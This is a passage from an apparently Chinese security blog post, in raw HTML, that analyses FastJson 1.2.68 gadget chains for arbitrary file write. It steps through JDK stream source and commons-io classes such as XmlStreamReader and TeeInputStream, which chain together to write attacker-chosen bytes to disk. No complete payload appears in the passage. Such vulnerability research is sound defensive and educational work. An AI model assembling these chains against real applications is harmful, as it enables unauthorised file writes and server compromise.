class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// —— 基本健壮性检查 ——</span></span><br><span class="line">    ensureOpen();  <span class="comment">// 确保流处于打开状态；否则抛出 IOException</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Null buffer for read&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (off &lt; <span class="number">0</span> || len &lt; <span class="number">0</span> || len &gt; b.length - off) &#123;</span><br><span class="line">        <span class="comment">// 越界检查：off/len 必须合法且窗口不能溢出</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 没有可写入的压缩数据，直接返回（不会尝试消费解压器中已有的输入）</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 将压缩数据解压为明文并写入下游输出流 ——</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 若解压器当前“缺少输入”，则从本次调用传入的 b(off..off+len) 中补充一段输入</span></span><br><span class="line">            <span class="keyword">if</span> (inf.needsInput()) &#123;</span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反复从解压器取“解压后的明文”放入本流的缓冲区 buf，再写到底层 out</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                n = inf.inflate(buf, <span class="number">0</span>, buf.length);  <span class="comment">// 将现有压缩输入解压到 buf</span></span><br><span class="line">                <span class="keyword">if</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    out.write(buf, <span class="number">0</span>, n);             <span class="comment">// 把 n 个明文字节写入下游输出流</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (n &gt; <span class="number">0</span>);  <span class="comment">// 只要还能产出明文，就持续写出</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 状态检查：若已到达压缩流结尾，整个写入流程结束</span></span><br><span class="line">            <span class="keyword">if</span> (inf.finished()) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 若该压缩流需要预设字典但当前未提供，按照约定抛出 ZipException</span></span><br><span class="line">            <span class="keyword">if</span> (inf.needsDictionary()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ZipException</span>(<span class="string">&quot;ZLIB dictionary missing&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 否则继续下一轮：要么再喂输入，要么继续解压</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (DataFormatException ex) &#123;</span><br><span class="line">        <span class="comment">// 压缩数据格式不正确（zlib/deflate 格式错误等），包装为 ZipException 抛出</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> ex.getMessage();</span><br><span class="line">        <span class="keyword">if</span> (msg == <span class="literal">null</span>) &#123;</span><br><span class="line">            msg = <span class="string">&quot;Invalid ZLIB data format&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ZipException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>InflaterOutputStream#write</code> 首先会通过 <code>inf.needsInput</code> 判断是否能够将当前 <code>write</code> 要输出的内容追加进去。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断内部“压缩输入窗口”里是否已经没有可消费的数据。</span></span><br><span class="line"><span class="comment"> * 当返回 true 时，通常表示需要调用 &#123;<span class="doctag">@link</span> #setInput(byte[])&#125; 或</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #setInput(byte[], int, int)&#125; 继续提供新的压缩数据。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 当内部输入缓冲区无剩余数据时返回 true</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">needsInput</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 以 zlib 状态引用（zsRef）为锁进行同步：</span></span><br><span class="line">    <span class="comment">// Inflater 背后维护着原生 zlib 的 z_stream 状态，非线程安全，</span></span><br><span class="line">    <span class="comment">// 这里加锁保证并发场景下读取剩余长度(len)的一致性。</span></span><br><span class="line">    <span class="keyword">synchronized</span> (zsRef) &#123;</span><br><span class="line">        <span class="comment">// len 表示当前“尚未被消费的压缩字节数”（窗口长度）。</span></span><br><span class="line">        <span class="comment">// 当 len &lt;= 0 时，说明已经没有可供 inflate() 消费的压缩数据了，</span></span><br><span class="line">        <span class="comment">// 需要调用方再次 setInput(...) 追加新的压缩字节。</span></span><br><span class="line">        <span class="keyword">return</span> len &lt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于前面通过 <code>Inflater#setInput</code> 的设置，这里 <code>len &gt; 0</code> 因此返回 <code>false</code>，因此这里不会将 <code>ObjectOutputStream</code> 内容追加进去，而是而是直接将 <code>InflaterOutputStream</code> 中缓存的内容解压到 <code>buf</code> 缓冲区中，然后调用 <code>FileOutputStream#write</code> 写入到指定的文件中。这里的 <code>buf</code> 是在调用 <code>InflaterOutputStream</code> 构造函数时根据 <code>bufLen</code> 参数指定的长度分配的缓冲区。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n = inf.inflate(buf, <span class="number">0</span>, buf.length);  <span class="comment">// 将现有压缩输入解压到 buf</span></span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    out.write(buf, <span class="number">0</span>, n);             <span class="comment">// 把 n 个明文字节写入下游输出流</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>Inflater#inflate</code> 会通过 JNI 调用解压 <code>Inflater#buf</code> 中的内容，然后将解压后的数据写入参数 <code>b</code> 的 <code>off</code> 偏移处，并返回解压后数据的长度 <code>n</code>。</p>
<blockquote>
<ul>
<li><p><strong>JNI</strong>（Java Native Interface）是 <strong>Java 调用本地代码（C&#x2F;C++&#x2F;汇编）</strong> 的桥梁。在 <code>java.util.zip.Inflater</code> 里你看到的 <code>inflateBytes(zsRef.address(), ...)</code> 本质上是个 <strong>native 方法</strong>：它把参数和一个 <strong>原生 zlib 状态指针</strong>（<code>zsRef</code> 里保存的 <code>z_stream*</code> 地址）传给 <strong>C 层的 zlib</strong>，由 zlib 完成实际解压。</p>
</li>
<li><p><code>inflate</code> 这里使用的是 <strong>DEFLATE</strong> 算法（<strong>RFC 1951</strong>），在 Java 的 <code>Inflater</code> 默认构造（<code>new Inflater()</code>，<code>nowrap=false</code>）下，期望的输入格式是 <strong>zlib 封装</strong>（<strong>RFC 1950</strong>）：</p>
<ul>
<li>具有 <strong>zlib 头部</strong>（常见首字节 <code>0x78</code>，Base64 往往以 <strong><code>eJ</code></strong> 开头）；</li>
<li>末尾带 <strong>Adler-32</strong> 校验。</li>
</ul>
<p>我们可以使用如下命令生成要写入文件的内容：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;asdads&#x27;</span> | python3 -c <span class="string">&#x27;import sys,zlib,base64;print(base64.b64encode(zlib.compress(sys.stdin.buffer.read())).decode())&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
</blockquote>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将压缩字节解压到指定缓冲区中，并返回本次实际解压出的字节数。</span></span><br><span class="line"><span class="comment"> * 若返回 0，表示需要调用 needsInput() 或 needsDictionary() 来判断</span></span><br><span class="line"><span class="comment"> * 是否需要更多输入数据，或需要预设字典。若需要字典，可用 getAdler()</span></span><br><span class="line"><span class="comment"> * 获取所需字典的 Adler-32 校验值。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> b   承接“解压后数据”的缓冲区</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> off 在缓冲区 b 中开始写入的偏移</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> len 本次最多写入（解压）多少字节</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>    实际解压写入的字节数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> DataFormatException 压缩数据格式非法/损坏</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> Inflater#needsInput</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> Inflater#needsDictionary</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">inflate</span><span class="params">(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> DataFormatException &#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(); <span class="comment">// 输出缓冲区不能为空</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (off &lt; <span class="number">0</span> || len &lt; <span class="number">0</span> || off &gt; b.length - len) &#123;</span><br><span class="line">        <span class="comment">// off+len 越界或参数为负</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArrayIndexOutOfBoundsException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">synchronized</span> (zsRef) &#123;               <span class="comment">// 以 zlib 原生状态引用为锁（线程不安全，需串行）</span></span><br><span class="line">        ensureOpen();                    <span class="comment">// 校验 Inflater 未 end()/关闭</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">thisLen</span> <span class="operator">=</span> <span class="built_in">this</span>.len;          <span class="comment">// 记录调用前“尚未消费的压缩输入”长度</span></span><br><span class="line">        <span class="comment">// JNI 调用：从当前输入窗口 [buf, off, len] 解压到 b[off..off+len)</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> inflateBytes(zsRef.address(), b, off, len);</span><br><span class="line">        bytesWritten += n;               <span class="comment">// 统计累计“解压输出”（明文）字节数</span></span><br><span class="line">        bytesRead += (thisLen - <span class="built_in">this</span>.len); <span class="comment">// 统计本次消耗的“压缩输入”字节数（窗口减少量）</span></span><br><span class="line">        <span class="keyword">return</span> n;                        <span class="comment">// 返回本次实际解压出的明文字节数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="XmlStreamReader"><a href="#XmlStreamReader" class="headerlink" title="XmlStreamReader"></a>XmlStreamReader</h5><p>前面的 <code>MarshalOutputStream</code> 利用链虽然只依赖于原生 JDK 中的类，但是其中 <code>sun.rmi.server.MarshalOutputStream</code>、<code>java.util.zip.InflaterOutputStream</code> 以及 <code>java.io.FileOutputStream</code> 均是基于带参数的构造函数进行构建。</p>
<p>而 FastJson 在通过带参构造函数进行反序列化时，会检查参数是否有参数名，只有含有参数名的带参构造函数才会被认可，且通常 JDK 中的字节码调试信息中没有 <code>LocalVariableTable</code>，因此该利用链对 Java 环境的要求较高，实际渗透测试中满足此要求的环境只占小部分（目前已知 CentOS 下的 OpenJDK 8 字节码调试信息，可以用来复现），因此需要寻找更为通用的利用链。</p>
<p>根据前面对 <code>MarshalOutputStream</code> 的利用链的分析，我们可以总结出基于 <code>JavaBeanDeserializer</code> 的<code>expectClass</code> 绕过利用链的挖掘思路：</p>
<ul>
<li>需要一个通过 setter 方法或构造方法指定文件路径的 <code>OutputStream</code>；</li>
<li>需要一个通过setter 方法或构造方法传入字节数据的 <code>OutputStream</code>，并且可以通过 setter 方法或构造方法传入一个 <code>OutputStream</code>，最后可以通过 <code>write</code> 方法将传入的字节码 <code>write</code> 到传入的 <code>OutputStream</code>；</li>
<li>需要一个通过 <code>set</code> 方法或构造方法传入一个 <code>OutputStream</code>，并且可以通过调用 <code>toString</code>、<code>hashCode</code>、getter、setter、构造方法调用传入的 <code>OutputStream</code> 的 flush 方法；</li>
</ul>
<p>由于大部分 JDK&#x2F;JRE 环境的类字节码里都不含有 <code>LocalVariableTable</code>，而很多第三方库里的字节码是有<code>LocalVariableTable</code> 的。因此我们可以把目光转向 maven 使用量 top100 的第三方库，寻找其中所有实现 <code>java.lang.AutoCloseable</code> 接口、同时保留有 <code>LocalVariableTable</code> 调试信息的类，并按照 FastJson 1.2.68 的黑名单进行筛选去除。</p>
<p>这里我们选择了 commons-io 库中的 <code>XmlStreamReader</code> 等几个类组成了一个利用链实现任意文件写。commons-io 库的 Maven 坐标如下：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>利用链中涉及到的 <code>org.apache.commons.io.input.XmlStreamReader</code>，<code>org.apache.commons.io.input.TeeInputStream</code>，<code>org.apache.commons.io.input.ReaderInputStream</code>，<code>org.apache.commons.io.input.CharSequenceReader</code>，<code>org.apache.commons.io.output.WriterOutputStream</code>，<code>org.apache.commons.io.output.FileWriterWithEncoding</code> 全部继承于 <code>java.lang.AutoCloseable</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/09/09/Java%20FastJson/images/XmlStreamReader.png"
                      alt="XmlStreamReader"
                ></p>
<hr>
<p><code>org.apache.commons.io.input.XmlStreamReader</code> 的构造函数中接受 <code>InputStream</code> 对象为参数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">XmlStreamReader</span><span class="params">(<span class="keyword">final</span> InputStream is, <span class="keyword">final</span> String httpContentType,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> <span class="type">boolean</span> lenient, <span class="keyword">final</span> String defaultEncoding)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>.defaultEncoding = defaultEncoding;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">BOMInputStream</span> <span class="variable">bom</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BOMInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is, BUFFER_SIZE), <span class="literal">false</span>, BOMS);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">BOMInputStream</span> <span class="variable">pis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BOMInputStream</span>(bom, <span class="literal">true</span>, XML_GUESS_BYTES);</span><br><span class="line">    <span class="built_in">this</span>.encoding = doHttpStream(bom, pis, httpContentType, lenient);</span><br><span class="line">    <span class="built_in">this</span>.reader = <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(pis, encoding);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>XmlStreamReader</code> 构造函数将输入的 <code>InputStream</code> 做了多层封装，形成了下面这种结构：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOMInputStream pis</span><br><span class="line">└── BOMInputStream bom</span><br><span class="line">    └── BufferedInputStream</span><br><span class="line">        └── InputStream</span><br></pre></td></tr></table></figure></div>

<p>并且 <code>XmlStreamReader</code> 构造函数中的 <code>doHttpStream</code> 函数会触发 <code>InputStream.read()</code>，调用，调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">at java.io.InputStream.read(InputStream.java:129)</span><br><span class="line">at java.io.BufferedInputStream.fill(BufferedInputStream.java:246)</span><br><span class="line">at java.io.BufferedInputStream.read(BufferedInputStream.java:265)</span><br><span class="line">at org.apache.commons.io.input.BOMInputStream.getBOM(BOMInputStream.java:224)</span><br><span class="line">at org.apache.commons.io.input.BOMInputStream.getBOMCharsetName(BOMInputStream.java:254)</span><br><span class="line">at org.apache.commons.io.input.XmlStreamReader.doHttpStream(XmlStreamReader.java:452)</span><br><span class="line">at org.apache.commons.io.input.XmlStreamReader.&lt;init&gt;(XmlStreamReader.java:339)</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>java.io.BufferedInputStream#fill</code> 方法调用的 <code>in</code> 也就是 <code>XmlStreamReader</code> 构造函数传入的参数 <code>InputStream is</code> 的 <code>read</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">fill</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> getInIfOpen().read(buffer, pos, buffer.length - pos);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> InputStream <span class="title function_">getInIfOpen</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">input</span> <span class="operator">=</span> in;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Stream closed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此 <code>XmlStreamReader</code> 的构造函数作为整个链的入口，链到 <code>InputStream.read(byte[], int, int)</code> 方法。</p>
<hr>
<p><code>org.apache.commons.io.input.TeeInputStream</code> 的构造函数接受 <code>InputStream</code> 和 <code>OutputStream</code> 对象为参数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TeeInputStream</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> InputStream input, <span class="keyword">final</span> OutputStream branch, <span class="keyword">final</span> <span class="type">boolean</span> closeBranch)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(input);</span><br><span class="line">    <span class="built_in">this</span>.branch = branch;</span><br><span class="line">    <span class="built_in">this</span>.closeBranch = closeBranch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而它的 <code>read</code> 方法，会把 <code>InputStream</code> 流里读出来的东西，再写到 <code>OutputStream</code> 流里，正如其名，像是管道重定向：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bts, <span class="keyword">final</span> <span class="type">int</span> st, <span class="keyword">final</span> <span class="type">int</span> end)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="built_in">super</span>.read(bts, st, end);</span><br><span class="line">    <span class="keyword">if</span> (n != -<span class="number">1</span>) &#123;</span><br><span class="line">        branch.write(bts, st, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过 <code>TeeInputStream</code>，<code>InputStream</code> 输入流里读出来的东西可以重定向写入到 <code>OutputStream</code> 输出流。</p>
<hr>
<p><code>org.apache.commons.io.input.ReaderInputStream</code> 的构造函数接受 <code>Reader</code> 对象作为参数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ReaderInputStream</span><span class="params">(<span class="keyword">final</span> Reader reader, <span class="keyword">final</span> CharsetEncoder encoder, <span class="keyword">final</span> <span class="type">int</span> bufferSize)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.reader = reader;</span><br><span class="line">    <span class="built_in">this</span>.encoder = encoder;</span><br><span class="line">    <span class="built_in">this</span>.encoderIn = CharBuffer.allocate(bufferSize);</span><br><span class="line">    <span class="built_in">this</span>.encoderIn.flip();</span><br><span class="line">    <span class="built_in">this</span>.encoderOut = ByteBuffer.allocate(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">this</span>.encoderOut.flip();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它在执行 <code>read</code> 方法时，会执行 <code>fillBuffer</code> 方法，从而执行 <code>Reader.read(char[], int, int)</code> 方法，从 <code>Reader</code> 中来获取输入：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Byte array must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span> || off &lt; <span class="number">0</span> || (off + len) &gt; b.length) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(<span class="string">&quot;Array Size=&quot;</span> + b.length +</span><br><span class="line">                <span class="string">&quot;, offset=&quot;</span> + off + <span class="string">&quot;, length=&quot;</span> + len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// Always return 0 if len == 0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (encoderOut.hasRemaining()) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> Math.min(encoderOut.remaining(), len);</span><br><span class="line">            encoderOut.get(b, off, c);</span><br><span class="line">            off += c;</span><br><span class="line">            len -= c;</span><br><span class="line">            read += c;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fillBuffer(); <span class="comment">// 👈</span></span><br><span class="line">            <span class="keyword">if</span> (endOfInput &amp;&amp; !encoderOut.hasRemaining()) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> read == <span class="number">0</span> &amp;&amp; endOfInput ? EOF : read;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">fillBuffer</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!endOfInput &amp;&amp; (lastCoderResult == <span class="literal">null</span> || lastCoderResult.isUnderflow())) &#123;</span><br><span class="line">        encoderIn.compact();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> encoderIn.position();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> reader.read(encoderIn.array(), position, encoderIn.remaining()); <span class="comment">// 👈</span></span><br><span class="line">        <span class="keyword">if</span> (c == EOF) &#123;</span><br><span class="line">            endOfInput = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            encoderIn.position(position+c);</span><br><span class="line">        &#125;</span><br><span class="line">        encoderIn.flip();</span><br><span class="line">    &#125;</span><br><span class="line">    encoderOut.compact();</span><br><span class="line">    lastCoderResult = encoder.encode(encoderIn, encoderOut, endOfInput);</span><br><span class="line">    encoderOut.flip();</span><br><span 